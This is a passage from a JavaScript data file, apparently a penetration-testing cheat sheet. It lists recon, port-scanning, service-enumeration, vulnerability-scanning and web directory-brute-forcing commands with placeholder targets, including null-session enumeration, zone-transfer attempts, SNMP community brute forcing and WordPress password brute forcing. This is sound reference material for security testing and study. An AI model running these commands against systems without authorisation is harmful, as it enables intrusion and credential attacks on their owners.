// cheat-sheet — Part 1
module.exports = [
  // ─────────────────────────────────────────────
  // 1. Target Profiling & Network Mapping
  // ─────────────────────────────────────────────
  {
    id: "recon",
    name: "Target Profiling & Network Mapping",
    icon: "🔍",
    description: "Enumerate targets through passive intelligence gathering, active scanning, and service fingerprinting to build a complete attack surface map.",
    subcategories: [
      {
        name: "Passive Intelligence",
        commands: [
          { title: "WHOIS Domain Lookup", desc: "Query WHOIS records for domain registration details", cmd: "whois <DOMAIN>", tags: ["essential"] },
          { title: "WHOIS IP Lookup", desc: "Query WHOIS for IP address ownership and netblock info", cmd: "whois <TARGET_IP>", tags: ["essential"] },
          { title: "DNS A Record Lookup", desc: "Resolve domain to IPv4 address using dig", cmd: "dig A <DOMAIN>", tags: ["essential"] },
          { title: "DNS MX Record Lookup", desc: "Enumerate mail exchange servers", cmd: "dig MX <DOMAIN>", tags: ["essential"] },
          { title: "DNS NS Record Lookup", desc: "Enumerate authoritative nameservers", cmd: "dig NS <DOMAIN>", tags: ["essential"] },
          { title: "DNS TXT Records", desc: "Retrieve TXT records (SPF, DKIM, DMARC)", cmd: "dig TXT <DOMAIN>", tags: ["essential"] },
          { title: "DNS ANY Records", desc: "Request all DNS record types at once", cmd: "dig ANY <DOMAIN> @<DNS_SERVER>", tags: ["essential"] },
          { title: "DNS Zone Transfer Attempt", desc: "Attempt AXFR zone transfer from nameserver", cmd: "dig axfr <DOMAIN> @<DNS_SERVER>", tags: ["essential"] },
          { title: "Host DNS Lookup", desc: "Simple DNS resolution with host command", cmd: "host <DOMAIN>", tags: ["essential"] },
          { title: "Host Reverse DNS", desc: "Reverse lookup IP to hostname", cmd: "host <TARGET_IP>", tags: ["essential"] },
          { title: "DNSRecon Standard Enumeration", desc: "Automated DNS enumeration with multiple record types", cmd: "dnsrecon -d <DOMAIN>", tags: ["essential", "tool"] },
          { title: "DNSRecon Zone Transfer", desc: "Attempt zone transfer via dnsrecon", cmd: "dnsrecon -d <DOMAIN> -t axfr", tags: ["essential", "tool"] },
          { title: "DNSRecon Brute Force", desc: "Brute force subdomains with wordlist", cmd: "dnsrecon -d <DOMAIN> -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt", tags: ["tool"] },
          { title: "DNSEnum Full Enumeration", desc: "Comprehensive DNS enumeration with zone transfer and brute force", cmd: "dnsenum <DOMAIN>", tags: ["tool"] },
          { title: "Sublist3r Subdomain Enum", desc: "Enumerate subdomains using search engines and public sources", cmd: "sublist3r -d <DOMAIN>", tags: ["tool"] },
          { title: "Amass Passive Enum", desc: "Passive subdomain enumeration with Amass", cmd: "amass enum -passive -d <DOMAIN>", tags: ["tool"] },
          { title: "Amass Active Enum", desc: "Active subdomain enumeration with brute force", cmd: "amass enum -active -d <DOMAIN> -brute -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt", tags: ["tool", "advanced"] },
          { title: "theHarvester Email & Subdomain Enum", desc: "Gather emails, subdomains, hosts from public sources", cmd: "theHarvester -d <DOMAIN> -b all -l 500", tags: ["tool"] },
          { title: "Shodan Host Info", desc: "Query Shodan for target IP information", cmd: "shodan host <TARGET_IP>", tags: ["tool"] },
          { title: "Shodan Domain Search", desc: "Search Shodan for hosts related to a domain", cmd: "shodan search hostname:<DOMAIN>", tags: ["tool"] },
          { title: "Google Dork - Site Files", desc: "Find exposed files on a domain", cmd: "site:<DOMAIN> filetype:pdf OR filetype:doc OR filetype:xls OR filetype:txt", tags: ["essential"], note: "Use in browser or via googler CLI" },
          { title: "Google Dork - Login Pages", desc: "Discover login portals", cmd: "site:<DOMAIN> inurl:login OR inurl:admin OR inurl:portal", tags: ["essential"], note: "Use in browser" },
          { title: "Google Dork - Directory Listings", desc: "Find open directory listings", cmd: "site:<DOMAIN> intitle:\"index of /\"", tags: ["essential"], note: "Use in browser" },
          { title: "Google Dork - Config Files", desc: "Locate exposed configuration files", cmd: "site:<DOMAIN> ext:xml OR ext:conf OR ext:cnf OR ext:ini OR ext:env OR ext:yml", tags: ["essential"], note: "Use in browser" },
          { title: "Google Dork - Database Files", desc: "Find exposed database dumps", cmd: "site:<DOMAIN> ext:sql OR ext:db OR ext:bak OR ext:log", tags: ["essential"], note: "Use in browser" },
          { title: "Google Dork - Sensitive Directories", desc: "Discover backup or sensitive paths", cmd: "site:<DOMAIN> inurl:backup OR inurl:old OR inurl:temp OR inurl:dev", tags: ["essential"], note: "Use in browser" },
          { title: "DMITRY Deep Information Gathering", desc: "Gather WHOIS, netcraft, subdomain, email, and port info", cmd: "dmitry -winsep <DOMAIN>", tags: ["tool"] },
          { title: "Fierce DNS Recon", desc: "DNS reconnaissance and subdomain brute force", cmd: "fierce --domain <DOMAIN>", tags: ["tool"] },
          { title: "Dig Reverse DNS Lookup", desc: "Reverse DNS lookup via dig", cmd: "dig -x <TARGET_IP>", tags: ["essential"] },
          { title: "Dig Short Answer", desc: "Get only the answer section from dig", cmd: "dig +short <DOMAIN>", tags: ["essential"] },
          { title: "Dig AAAA (IPv6) Record", desc: "Query IPv6 AAAA records", cmd: "dig AAAA <DOMAIN>", tags: ["essential"] },
          { title: "Dig SRV Records", desc: "Query SRV records for service discovery", cmd: "dig SRV _ldap._tcp.<DOMAIN>", tags: ["tool"] },
          { title: "Dig with Specific DNS Server", desc: "Query a specific DNS server", cmd: "dig <DOMAIN> @8.8.8.8", tags: ["essential"] },
          { title: "Nslookup Interactive", desc: "Interactive DNS queries with nslookup", cmds: ["nslookup", "server <DNS_SERVER>", "set type=any", "<DOMAIN>"], tags: ["essential"] },
          { title: "Nslookup Reverse Lookup", desc: "Reverse DNS lookup with nslookup", cmd: "nslookup <TARGET_IP>", tags: ["essential"] },
          { title: "Traceroute to Target", desc: "Trace network path to target", cmd: "traceroute <TARGET_IP>", tags: ["essential"] },
          { title: "Traceroute TCP", desc: "TCP traceroute to bypass ICMP filtering", cmd: "traceroute -T -p 80 <TARGET_IP>", tags: ["tool"] },
          { title: "Ping Sweep (Bash Loop)", desc: "Quick ping sweep using bash for loop", cmd: "for i in $(seq 1 254); do (ping -c 1 -W 1 <SUBNET>.$i | grep 'from' &); done; wait", tags: ["essential"], note: "Replace <SUBNET> with the first three octets" },
          { title: "Ping Sweep (Nmap)", desc: "Ping sweep with Nmap ARP discovery", cmd: "nmap -sn -PR <SUBNET>/24", tags: ["essential"] },
          { title: "NBTScan Subnet Scan", desc: "Scan subnet for NetBIOS names and MACs", cmd: "nbtscan -r <SUBNET>/24", tags: ["tool"] },
          { title: "Finger User Enumeration Script", desc: "Enumerate common users via finger service", cmd: "for user in root admin guest test; do finger $user@<TARGET_IP>; done", tags: ["tool"] },
        ]
      },
      {
        name: "Active Port Scanning",
        commands: [
          { title: "Nmap SYN Scan (Stealth)", desc: "Fast SYN scan on all ports — the default go-to scan", cmd: "nmap -sS -p- --min-rate 5000 -Pn -n <TARGET_IP> -oN nmap_syn.txt", tags: ["essential"] },
          { title: "Nmap TCP Connect Scan", desc: "Full TCP handshake scan — use when SYN scan is not available", cmd: "nmap -sT -p- --min-rate 5000 -Pn -n <TARGET_IP> -oN nmap_connect.txt", tags: ["essential"] },
          { title: "Nmap UDP Scan (Top Ports)", desc: "Scan top UDP ports for common services", cmd: "nmap -sU --top-ports 200 --min-rate 5000 -Pn -n <TARGET_IP> -oN nmap_udp.txt", tags: ["essential"] },
          { title: "Nmap Quick Top 1000", desc: "Fast scan of default top 1000 TCP ports", cmd: "nmap -sS --min-rate 5000 -Pn -n <TARGET_IP> -oN nmap_quick.txt", tags: ["essential"] },
          { title: "Nmap Specific Port Scan", desc: "Scan specific ports of interest", cmd: "nmap -sS -p <PORT1>,<PORT2>,<PORT3> -Pn -n <TARGET_IP>", tags: ["essential"] },
          { title: "Nmap Ping Sweep", desc: "Discover live hosts on a subnet", cmd: "nmap -sn <SUBNET>/24 -oN nmap_sweep.txt", tags: ["essential"] },
          { title: "Nmap List Scan", desc: "List targets without scanning (DNS resolution only)", cmd: "nmap -sL <SUBNET>/24", tags: ["essential"] },
          { title: "Masscan Full Port Scan", desc: "Ultra-fast port scanning on all TCP ports", cmd: "masscan -p1-65535 <TARGET_IP> --rate=1000 -e tun0 --router-ip <GATEWAY_IP>", tags: ["tool"] },
          { title: "Masscan Top Ports", desc: "Fast scan of common ports with masscan", cmd: "masscan -p 21,22,23,25,53,80,110,139,443,445,993,995,1433,3306,3389,5432,8080,8443 <TARGET_IP> --rate=1000", tags: ["tool"] },
          { title: "RustScan Quick Scan", desc: "Lightning-fast port scan with automatic nmap handoff", cmd: "rustscan -a <TARGET_IP> --ulimit 5000 -- -sV -sC", tags: ["tool"] },
          { title: "RustScan Specific Ports", desc: "RustScan with specific port range", cmd: "rustscan -a <TARGET_IP> -r 1-65535 --ulimit 5000 -- -A", tags: ["tool"] },
        ]
      },
      {
        name: "Service Fingerprinting",
        commands: [
          { title: "Nmap Service Version Detection", desc: "Probe open ports for service versions on discovered ports", cmd: "nmap -sV -sC -p <PORTS> -Pn -n <TARGET_IP> -oN nmap_svc.txt", tags: ["essential"] },
          { title: "Nmap Aggressive Scan", desc: "OS detection, version, scripts, and traceroute", cmd: "nmap -A -p <PORTS> -Pn -n <TARGET_IP> -oN nmap_aggressive.txt", tags: ["essential"] },
          { title: "Nmap OS Detection", desc: "Attempt operating system fingerprinting", cmd: "nmap -O -p <PORTS> -Pn <TARGET_IP>", tags: ["essential"] },
          { title: "Nmap Default Scripts", desc: "Run default NSE script suite against services", cmd: "nmap -sC -p <PORTS> -Pn -n <TARGET_IP>", tags: ["essential"] },
          { title: "Nmap All Scripts Safe", desc: "Run all safe-category NSE scripts", cmd: "nmap --script safe -p <PORTS> -Pn -n <TARGET_IP>", tags: ["advanced"] },
          { title: "Nmap Vulnerability Scripts", desc: "Run vulnerability scanning scripts", cmd: "nmap --script vuln -p <PORTS> -Pn -n <TARGET_IP> -oN nmap_vuln.txt", tags: ["essential"] },
          { title: "Nmap Script Category Run", desc: "Run specific NSE script categories", cmd: "nmap --script \"discovery and safe\" -p <PORTS> -Pn -n <TARGET_IP>", tags: ["advanced"] },
          { title: "Netcat Banner Grab", desc: "Connect to service and grab banner manually", cmd: "nc -nv <TARGET_IP> <PORT>", tags: ["essential"] },
          { title: "Nmap Banner Grab Script", desc: "Grab service banners via NSE", cmd: "nmap --script banner -p <PORTS> -Pn -n <TARGET_IP>", tags: ["essential"] },
          { title: "Nmap Version Intensity Max", desc: "Maximum version detection intensity", cmd: "nmap -sV --version-intensity 5 -p <PORTS> -Pn -n <TARGET_IP>", tags: ["advanced"] },
        ]
      },
      {
        name: "SMB & NetBIOS Probing",
        commands: [
          { title: "Enum4linux Full Enumeration", desc: "Enumerate SMB shares, users, groups, policies", cmd: "enum4linux -a <TARGET_IP>", tags: ["essential", "tool"] },
          { title: "Enum4linux-ng Full Scan", desc: "Modern Python rewrite with JSON output", cmd: "enum4linux-ng -A <TARGET_IP>", tags: ["tool"] },
          { title: "SMBClient List Shares (Null)", desc: "List SMB shares with null session", cmd: "smbclient -L //<TARGET_IP> -N", tags: ["essential"] },
          { title: "SMBClient Connect to Share", desc: "Connect to a specific share", cmd: "smbclient //<TARGET_IP>/<SHARE> -U <USER>%<PASS>", tags: ["essential"] },
          { title: "SMBClient Null Auth Connect", desc: "Connect to share with null session", cmd: "smbclient //<TARGET_IP>/<SHARE> -N", tags: ["essential"] },
          { title: "SMBMap Enumerate Shares", desc: "Enumerate shares and permissions", cmd: "smbmap -H <TARGET_IP>", tags: ["essential", "tool"] },
          { title: "SMBMap Authenticated", desc: "Enumerate shares with credentials", cmd: "smbmap -H <TARGET_IP> -u <USER> -p <PASS>", tags: ["essential", "tool"] },
          { title: "SMBMap Recursive Listing", desc: "Recursively list files in a share", cmd: "smbmap -H <TARGET_IP> -u <USER> -p <PASS> -r <SHARE>", tags: ["tool"] },
          { title: "SMBMap Download File", desc: "Download a file from a share", cmd: "smbmap -H <TARGET_IP> -u <USER> -p <PASS> --download '<SHARE>\\path\\to\\file'", tags: ["tool"] },
          { title: "CrackMapExec SMB Enum", desc: "Enumerate SMB info, shares, users", cmd: "crackmapexec smb <TARGET_IP>", tags: ["essential", "tool"] },
          { title: "CrackMapExec SMB Shares", desc: "List shares with credentials", cmd: "crackmapexec smb <TARGET_IP> -u <USER> -p <PASS> --shares", tags: ["tool"] },
          { title: "CrackMapExec SMB Users", desc: "Enumerate domain users via SMB", cmd: "crackmapexec smb <TARGET_IP> -u <USER> -p <PASS> --users", tags: ["tool"] },
          { title: "CrackMapExec SMB Sessions", desc: "Enumerate active sessions", cmd: "crackmapexec smb <TARGET_IP> -u <USER> -p <PASS> --sessions", tags: ["tool"] },
          { title: "Nmap SMB Enum Shares", desc: "Enumerate SMB shares via NSE", cmd: "nmap --script smb-enum-shares -p 445 -Pn <TARGET_IP>", tags: ["essential"] },
          { title: "Nmap SMB Enum Users", desc: "Enumerate SMB users via NSE", cmd: "nmap --script smb-enum-users -p 445 -Pn <TARGET_IP>", tags: ["essential"] },
          { title: "Nmap SMB OS Discovery", desc: "Discover OS via SMB", cmd: "nmap --script smb-os-discovery -p 445 -Pn <TARGET_IP>", tags: ["essential"] },
          { title: "Nmap SMB Vuln Scan", desc: "Check for known SMB vulnerabilities", cmd: "nmap --script smb-vuln* -p 445 -Pn <TARGET_IP>", tags: ["essential"] },
          { title: "NBTScan NetBIOS Enum", desc: "Scan subnet for NetBIOS name information", cmd: "nbtscan <SUBNET>/24", tags: ["tool"] },
          { title: "NBTScan Single Host", desc: "Get NetBIOS info for single target", cmd: "nbtscan -v <TARGET_IP>", tags: ["tool"] },
        ]
      },
      {
        name: "SNMP Discovery",
        commands: [
          { title: "SNMPWalk Full Tree", desc: "Walk the entire SNMP MIB tree with community string", cmd: "snmpwalk -v2c -c public <TARGET_IP>", tags: ["essential"] },
          { title: "SNMPWalk System Info", desc: "Retrieve system description", cmd: "snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.2.1.1", tags: ["essential"] },
          { title: "SNMPWalk Running Processes", desc: "Enumerate running processes via SNMP", cmd: "snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.2.1.25.4.2.1.2", tags: ["essential"] },
          { title: "SNMPWalk Installed Software", desc: "Enumerate installed software", cmd: "snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.2.1.25.6.3.1.2", tags: ["advanced"] },
          { title: "SNMPWalk TCP Connections", desc: "Enumerate active TCP connections", cmd: "snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.2.1.6.13.1.3", tags: ["advanced"] },
          { title: "SNMPWalk User Accounts", desc: "Enumerate Windows user accounts via SNMP", cmd: "snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.4.1.77.1.2.25", tags: ["essential"] },
          { title: "OneSixtyOne Community Brute", desc: "Brute force SNMP community strings", cmd: "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <TARGET_IP>", tags: ["essential", "tool"] },
          { title: "SNMP-Check Full Enum", desc: "Comprehensive SNMP enumeration", cmd: "snmp-check <TARGET_IP> -c public", tags: ["tool"] },
        ]
      },
      {
        name: "LDAP & RPC Queries",
        commands: [
          { title: "LDAPSearch Anonymous Bind", desc: "Attempt anonymous LDAP enumeration", cmd: "ldapsearch -x -H ldap://<TARGET_IP> -b '' -s base namingcontexts", tags: ["essential"] },
          { title: "LDAPSearch Dump All", desc: "Dump entire LDAP directory with credentials", cmd: "ldapsearch -x -H ldap://<TARGET_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN_PART1>,DC=<DOMAIN_PART2>'", tags: ["essential"] },
          { title: "LDAPSearch Find Users", desc: "Extract all user objects from LDAP", cmd: "ldapsearch -x -H ldap://<TARGET_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN_PART1>,DC=<DOMAIN_PART2>' '(objectClass=user)' sAMAccountName", tags: ["essential"] },
          { title: "LDAPSearch Find Computers", desc: "Extract computer objects from LDAP", cmd: "ldapsearch -x -H ldap://<TARGET_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN_PART1>,DC=<DOMAIN_PART2>' '(objectClass=computer)' cn", tags: ["advanced"] },
          { title: "RPCClient Null Session", desc: "Connect with null session to enumerate", cmd: "rpcclient -U '' -N <TARGET_IP>", tags: ["essential"] },
          { title: "RPCClient Enum Domain Users", desc: "Enumerate domain users via RPC", cmd: "rpcclient -U '' -N <TARGET_IP> -c 'enumdomusers'", tags: ["essential"] },
          { title: "RPCClient Enum Domain Groups", desc: "Enumerate domain groups via RPC", cmd: "rpcclient -U '' -N <TARGET_IP> -c 'enumdomgroups'", tags: ["essential"] },
          { title: "RPCClient Query User", desc: "Get details for a specific user RID", cmd: "rpcclient -U '' -N <TARGET_IP> -c 'queryuser 0x1f4'", tags: ["advanced"] },
          { title: "RPCClient Enum Printers", desc: "Enumerate printers via RPC", cmd: "rpcclient -U '' -N <TARGET_IP> -c 'enumprinters'", tags: ["advanced"] },
          { title: "RPCClient Server Info", desc: "Get server info via RPC", cmd: "rpcclient -U '' -N <TARGET_IP> -c 'srvinfo'", tags: ["essential"] },
          { title: "Finger User Enumeration", desc: "Enumerate users via finger service", cmd: "finger @<TARGET_IP>", tags: ["tool"] },
          { title: "Finger Specific User", desc: "Query specific user via finger", cmd: "finger <USER>@<TARGET_IP>", tags: ["tool"] },
          { title: "Ident User Enum", desc: "Enumerate users via identd service", cmd: "ident-user-enum <TARGET_IP> 22 113 445", tags: ["tool"] },
          { title: "SMTP User Enum VRFY", desc: "Enumerate users via SMTP VRFY command", cmd: "smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t <TARGET_IP>", tags: ["tool"] },
          { title: "SMTP User Enum RCPT", desc: "Enumerate users via SMTP RCPT TO", cmd: "smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/Names/names.txt -t <TARGET_IP>", tags: ["tool"] },
        ]
      },
      {
        name: "HTTP Footprinting",
        commands: [
          { title: "WhatWeb Fingerprint", desc: "Identify web technologies and CMS", cmd: "whatweb <TARGET_IP>", tags: ["essential", "tool"] },
          { title: "WhatWeb Aggressive", desc: "Aggressive web technology fingerprinting", cmd: "whatweb -a 3 http://<TARGET_IP>", tags: ["tool"] },
          { title: "Curl Headers", desc: "Retrieve HTTP response headers", cmd: "curl -I http://<TARGET_IP>", tags: ["essential"] },
          { title: "Curl Full Response", desc: "Get full HTTP response with headers", cmd: "curl -v http://<TARGET_IP>", tags: ["essential"] },
          { title: "Curl Follow Redirects", desc: "Follow redirects and show final page", cmd: "curl -L http://<TARGET_IP>", tags: ["essential"] },
          { title: "Curl Custom Method", desc: "Send request with specific HTTP method", cmd: "curl -X OPTIONS http://<TARGET_IP> -v", tags: ["advanced"] },
          { title: "Nikto Web Scan", desc: "Comprehensive web server vulnerability scanner", cmd: "nikto -h http://<TARGET_IP>", tags: ["essential", "tool"] },
          { title: "Nikto with Port", desc: "Nikto scan on non-standard port", cmd: "nikto -h http://<TARGET_IP>:<PORT>", tags: ["tool"] },
          { title: "Nikto SSL Scan", desc: "Nikto scan with SSL", cmd: "nikto -h https://<TARGET_IP> -ssl", tags: ["tool"] },
          { title: "WAF Detection with wafw00f", desc: "Detect Web Application Firewalls", cmd: "wafw00f http://<TARGET_IP>", tags: ["tool"] },
          { title: "wafw00f All WAFs", desc: "Test against all known WAF signatures", cmd: "wafw00f -a http://<TARGET_IP>", tags: ["tool"] },
          { title: "Curl HTTP Methods Check", desc: "Test allowed HTTP methods with OPTIONS", cmd: "curl -X OPTIONS http://<TARGET_IP>/ -I", tags: ["essential"] },
          { title: "Curl Custom Host Header", desc: "Send request with custom Host header for vhost testing", cmd: "curl -H 'Host: <VHOST>' http://<TARGET_IP>/", tags: ["essential"] },
          { title: "WhatWeb Verbose Output", desc: "Detailed web tech fingerprinting with verbose", cmd: "whatweb -v http://<TARGET_IP>", tags: ["tool"] },
          { title: "Nmap HTTP Title", desc: "Grab web page titles via nmap NSE", cmd: "nmap --script http-title -p 80,443,8080,8443 -Pn <TARGET_IP>", tags: ["essential"] },
          { title: "Nmap HTTP Headers", desc: "Extract HTTP headers via nmap NSE", cmd: "nmap --script http-headers -p 80,443 -Pn <TARGET_IP>", tags: ["essential"] },
          { title: "Curl CORS Test", desc: "Test for CORS misconfiguration", cmd: "curl -s -I -H 'Origin: https://evil.com' http://<TARGET_IP>/ | grep -i 'Access-Control'", tags: ["essential"] },
        ]
      }
    ]
  },

  // ─────────────────────────────────────────────
  // 2. Weakness Identification & Scanning
  // ─────────────────────────────────────────────
  {
    id: "vuln-assessment",
    name: "Weakness Identification & Scanning",
    icon: "⚡",
    description: "Identify known vulnerabilities and misconfigurations across network services and web applications using automated scanners and targeted scripts.",
    subcategories: [
      {
        name: "Network-Level Scanning",
        commands: [
          { title: "Nmap Vuln Scripts", desc: "Run all vuln-category NSE scripts", cmd: "nmap --script vuln -p <PORTS> -Pn <TARGET_IP> -oN nmap_vuln.txt", tags: ["essential"] },
          { title: "Nmap MS17-010 (EternalBlue)", desc: "Check for EternalBlue SMB vulnerability", cmd: "nmap --script smb-vuln-ms17-010 -p 445 -Pn <TARGET_IP>", tags: ["essential"] },
          { title: "Nmap MS08-067 (Conficker)", desc: "Check for MS08-067 NetAPI vulnerability", cmd: "nmap --script smb-vuln-ms08-067 -p 445 -Pn <TARGET_IP>", tags: ["essential"] },
          { title: "Nmap Heartbleed Check", desc: "Test for OpenSSL Heartbleed vulnerability", cmd: "nmap --script ssl-heartbleed -p 443 -Pn <TARGET_IP>", tags: ["essential"] },
          { title: "Nmap Shellshock Check", desc: "Test for Bash Shellshock vulnerability", cmd: "nmap --script http-shellshock --script-args uri=/cgi-bin/<SCRIPT> -p 80 -Pn <TARGET_IP>", tags: ["essential"] },
          { title: "Nmap SMB Vuln Scan All", desc: "Check for all SMB vulnerabilities", cmd: "nmap --script 'smb-vuln-*' -p 445 -Pn <TARGET_IP>", tags: ["essential"] },
          { title: "Nmap FTP Anonymous Check", desc: "Check for anonymous FTP login", cmd: "nmap --script ftp-anon -p 21 -Pn <TARGET_IP>", tags: ["essential"] },
          { title: "Nmap HTTP Methods Check", desc: "Enumerate allowed HTTP methods (PUT, DELETE)", cmd: "nmap --script http-methods -p 80,443 -Pn <TARGET_IP>", tags: ["essential"] },
          { title: "Nmap HTTP Robots Check", desc: "Retrieve and display robots.txt", cmd: "nmap --script http-robots.txt -p 80,443 -Pn <TARGET_IP>", tags: ["essential"] },
          { title: "Nmap HTTP Enum", desc: "Enumerate common web directories and files", cmd: "nmap --script http-enum -p 80,443 -Pn <TARGET_IP>", tags: ["essential"] },
          { title: "Nmap RDP Bluekeep Check", desc: "Check for CVE-2019-0708 BlueKeep", cmd: "nmap --script rdp-vuln-ms12-020 -p 3389 -Pn <TARGET_IP>", tags: ["advanced"] },
          { title: "SSLScan Full Analysis", desc: "Analyze SSL/TLS ciphers and certificates", cmd: "sslscan <TARGET_IP>:443", tags: ["essential", "tool"] },
          { title: "TestSSL Full Test", desc: "Comprehensive SSL/TLS testing", cmd: "testssl.sh https://<TARGET_IP>", tags: ["tool"] },
          { title: "TestSSL Vulnerabilities Only", desc: "Test for known SSL vulnerabilities only", cmd: "testssl.sh --vulnerable https://<TARGET_IP>", tags: ["tool"] },
          { title: "Nmap SSL Enum Ciphers", desc: "Enumerate SSL/TLS ciphers and protocols", cmd: "nmap --script ssl-enum-ciphers -p 443 -Pn <TARGET_IP>", tags: ["essential"] },
          { title: "Nmap SSL Certificate Info", desc: "Extract SSL certificate details", cmd: "nmap --script ssl-cert -p 443 -Pn <TARGET_IP>", tags: ["essential"] },
        ]
      },
      {
        name: "Web App Scanning",
        commands: [
          { title: "Nikto Full Web Scan", desc: "Comprehensive web server vulnerability scan", cmd: "nikto -h http://<TARGET_IP>", tags: ["essential", "tool"] },
          { title: "Nikto with Tuning", desc: "Nikto scan focused on specific test types", cmd: "nikto -h http://<TARGET_IP> -Tuning 123bde", tags: ["tool"], note: "Tuning: 1=files, 2=misconfig, 3=info disclosure, b=software id, d=debug, e=remote sources" },
          { title: "Nuclei Default Templates", desc: "Run Nuclei with all default templates", cmd: "nuclei -u http://<TARGET_IP>", tags: ["essential", "tool"] },
          { title: "Nuclei Severity Filter", desc: "Run Nuclei for critical and high severity only", cmd: "nuclei -u http://<TARGET_IP> -severity critical,high", tags: ["tool"] },
          { title: "Nuclei Specific Tags", desc: "Run Nuclei templates matching specific tags", cmd: "nuclei -u http://<TARGET_IP> -tags cve,sqli,xss,rce,lfi", tags: ["tool"] },
          { title: "Nuclei with Target List", desc: "Run Nuclei against multiple targets from file", cmd: "nuclei -l targets.txt -severity critical,high,medium -o nuclei_results.txt", tags: ["tool"] },
          { title: "Nuclei Technology-Specific", desc: "Run Nuclei for a specific technology stack", cmd: "nuclei -u http://<TARGET_IP> -tags apache,nginx,iis,tomcat", tags: ["tool"] },
        ]
      },
      {
        name: "CMS-Specific Scanners",
        commands: [
          { title: "WPScan Full Enumeration", desc: "Full WordPress scan with plugins, themes, users", cmd: "wpscan --url http://<TARGET_IP> -e ap,at,u --plugins-detection aggressive", tags: ["essential", "tool"] },
          { title: "WPScan with API Token", desc: "WordPress scan with vulnerability database lookup", cmd: "wpscan --url http://<TARGET_IP> -e ap,at,u --api-token <WPSCAN_TOKEN>", tags: ["tool"] },
          { title: "WPScan Password Brute Force", desc: "Brute force WordPress login credentials", cmd: "wpscan --url http://<TARGET_IP> -U <USER> -P /usr/share/wordlists/rockyou.txt", tags: ["tool"] },
          { title: "WPScan Enumerate Vulnerable Plugins", desc: "Enumerate plugins with known vulnerabilities", cmd: "wpscan --url http://<TARGET_IP> -e vp --plugins-detection aggressive", tags: ["essential", "tool"] },
          { title: "WPScan Enumerate Users", desc: "Enumerate WordPress usernames", cmd: "wpscan --url http://<TARGET_IP> -e u", tags: ["essential", "tool"] },
          { title: "WPScan with Custom WP Path", desc: "Scan WordPress on non-standard path", cmd: "wpscan --url http://<TARGET_IP>/<WP_PATH> --wp-content-dir wp-content", tags: ["tool"] },
          { title: "JoomScan Full Scan", desc: "Joomla vulnerability scanner", cmd: "joomscan -u http://<TARGET_IP>", tags: ["tool"] },
          { title: "JoomScan Enum Components", desc: "Enumerate Joomla components", cmd: "joomscan -u http://<TARGET_IP> -ec", tags: ["tool"] },
          { title: "DroopeScan Drupal", desc: "Scan Drupal installation for vulnerabilities", cmd: "droopescan scan drupal -u http://<TARGET_IP>", tags: ["tool"] },
          { title: "DroopeScan SilverStripe", desc: "Scan SilverStripe CMS", cmd: "droopescan scan silverstripe -u http://<TARGET_IP>", tags: ["tool"] },
        ]
      }
    ]
  },

  // ─────────────────────────────────────────────
  // 3. Web Attack Techniques
  // ─────────────────────────────────────────────
  {
    id: "web-exploitation",
    name: "Web Attack Techniques",
    icon: "🌐",
    description: "Exploit web application vulnerabilities including directory traversal, injection, file upload, and server-side attacks to gain unauthorized access.",
    subcategories: [
      {
        name: "Path & Content Discovery",
        commands: [
          { title: "Gobuster Directory Brute Force", desc: "Brute force directories and files", cmd: "gobuster dir -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobuster.txt", tags: ["essential", "tool"] },
          { title: "Gobuster with Extensions", desc: "Brute force with file extension filter", cmd: "gobuster dir -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,bak,asp,aspx,jsp -o gobuster_ext.txt", tags: ["essential", "tool"] },
          { title: "Gobuster DNS Subdomain", desc: "Brute force subdomains via DNS", cmd: "gobuster dns -d <DOMAIN> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt", tags: ["tool"] },
          { title: "Gobuster VHost Brute Force", desc: "Brute force virtual hosts", cmd: "gobuster vhost -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain", tags: ["tool"] },
          { title: "Gobuster with Cookies", desc: "Directory brute force with session cookie", cmd: "gobuster dir -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -c 'session=<COOKIE>'", tags: ["tool"] },
          { title: "Feroxbuster Recursive", desc: "Recursive directory brute force", cmd: "feroxbuster -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -o ferox.txt", tags: ["essential", "tool"] },
          { title: "Feroxbuster with Depth", desc: "Control recursion depth", cmd: "feroxbuster -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --depth 3 -x php,html,txt", tags: ["tool"] },
          { title: "FFUF Directory Discovery", desc: "Fast directory fuzzing with ffuf", cmd: "ffuf -u http://<TARGET_IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o ffuf.json", tags: ["essential", "tool"] },
          { title: "FFUF VHost Discovery", desc: "Virtual host discovery with ffuf", cmd: "ffuf -u http://<TARGET_IP> -H 'Host: FUZZ.<DOMAIN>' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <FILTER_SIZE>", tags: ["tool"] },
          { title: "FFUF Extension Fuzzing", desc: "Fuzz for files with specific extensions", cmd: "ffuf -u http://<TARGET_IP>/indexFUZZ -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt", tags: ["tool"] },
          { title: "Dirsearch Standard", desc: "Web path scanner with smart wordlist", cmd: "dirsearch -u http://<TARGET_IP> -e php,html,txt,asp,aspx,jsp", tags: ["tool"] },
          { title: "Dirb Default Scan", desc: "Web content brute force with dirb", cmd: "dirb http://<TARGET_IP>", tags: ["tool"] },
